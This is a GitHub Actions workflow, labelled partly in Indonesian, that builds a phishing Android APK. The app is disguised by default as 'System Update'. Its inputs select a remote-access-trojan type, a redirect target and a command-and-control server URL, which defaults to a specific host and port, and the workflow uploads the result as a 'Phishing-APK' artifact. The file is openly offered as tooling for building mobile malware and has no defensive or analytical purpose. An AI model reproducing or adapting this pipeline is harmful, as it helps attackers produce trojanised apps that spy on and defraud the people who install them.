name: Auto Build Phishing APK

on:
  workflow_dispatch:
    inputs:
      app_name:
        description: "Nama Aplikasi"
        required: true
        default: "System Update"
      app_id:
        description: "ApplicationId"
        required: false
        default: "com.sync.xxx"
      rat_type:
        description: "ALL atau TWO"
        required: true
        default: "ALL"
        type: choice
        options:
          - ALL
          - TWO
      redirect_mode:
        description: "URL atau HTML"
        required: true
        default: "URL"
        type: choice
        options:
          - URL
          - HTML
      redirect_value:
        description: "URL atau HTML"
        required: true
        default: "https://example.com"
      server_url:
        description: "C2 URL"
        required: true
        default: "http://papsky.queen-official.com:2468"
      pair_id:
        description: "Pair ID"
        required: false
        default: ""
      icon_base64:
        description: "Icon PNG base64"
        required: false
        default: ""
      version_name:
        required: false
        default: "1.0"
      version_code:
        required: false
        default: "1"

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      actions: write

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-java@v4
        with:
          java-version: "17"
          distribution: "temurin"

      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: Install python deps
        run: pip install Pillow

      - name: Pair ID
        id: pair
        run: |
          PAIR="${{ github.event.inputs.pair_id }}"
          if [ -z "$PAIR" ]; then
            RAND=$(printf "%04d" $((RANDOM % 10000)))
            PAIR="NEONXJZET$(date +%s | tail -c 5)${RAND}"
          fi
          echo "pair_id=$PAIR" >> $GITHUB_OUTPUT
          echo "PAIR=$PAIR"

      - name: Inject config
        env:
          APP_NAME: ${{ github.event.inputs.app_name }}
          APP_ID: ${{ github.event.inputs.app_id }}
          RAT_TYPE: ${{ github.event.inputs.rat_type }}
          REDIRECT_MODE: ${{ github.event.inputs.redirect_mode }}
          REDIRECT_VALUE: ${{ github.event.inputs.redirect_value }}
          SERVER_URL: ${{ github.event.inputs.server_url }}
          PAIR_ID: ${{ steps.pair.outputs.pair_id }}
          ICON_BASE64: ${{ github.event.inputs.icon_base64 }}
          VERSION_NAME: ${{ github.event.inputs.version_name }}
          VERSION_CODE: ${{ github.event.inputs.version_code }}
        run: |
          set -e
          python3 builder/inject_config.py
          echo "Inject OK"

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      - name: Accept licenses
        run: |
          yes | sdkmanager --licenses >/dev/null || true
          sdkmanager "platforms;android-34" "build-tools;34.0.0" >/dev/null || true

      - name: Make gradlew executable
        run: |
          chmod +x android/gradlew || true
          ls -la android/
          ls -la android/gradle/wrapper/ || true

      - name: Build APK
        working-directory: android
        run: |
          set -e
          ./gradlew assembleRelease --no-daemon --stacktrace

      - name: Collect APK
        id: apk
        run: |
          set -e
          mkdir -p output
          APK=$(find android -name "*.apk" | head -1)
          if [ -z "$APK" ]; then
            echo "APK not found"
            find android -name "*.apk" || true
            exit 1
          fi
          SAFE=$(echo "${{ github.event.inputs.app_name }}" | tr -cd 'A-Za-z0-9._-' | cut -c1-40)
          OUT="output/${SAFE}_${{ steps.pair.outputs.pair_id }}.apk"
          cp "$APK" "$OUT"
          echo "path=$OUT" >> $GITHUB_OUTPUT
          ls -lh "$OUT"

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: Phishing-APK-${{ steps.pair.outputs.pair_id }}
          path: output/*.apk
          retention-days: 15

      - name: Summary
        run: |
          echo "### BUILD OK" >> $GITHUB_STEP_SUMMARY
          echo "- Pair: ${{ steps.pair.outputs.pair_id }}" >> $GITHUB_STEP_SUMMARY
          echo "- App: ${{ github.event.inputs.app_name }}" >> $GITHUB_STEP_SUMMARY
